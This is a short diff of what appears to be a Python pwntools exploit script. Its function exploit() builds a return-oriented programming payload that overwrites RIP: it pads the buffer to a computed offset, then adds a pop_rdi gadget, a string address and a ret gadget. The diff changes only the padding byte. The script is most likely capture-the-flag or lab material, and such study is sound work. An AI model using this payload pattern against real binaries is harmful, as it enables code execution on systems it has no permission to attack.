@@ -47,7 +47,7 @@ def exploit(binary_path):
         log.debug(f"The offset calculated overwrite RIP is {offset} bytes")
 
         # Construct the payload
-        payload = b'\x41' * offset
+        payload = b'\x69' * offset
         payload += p64(pop_rdi)
         payload += p64(string_addr)
         payload += p64(ret)
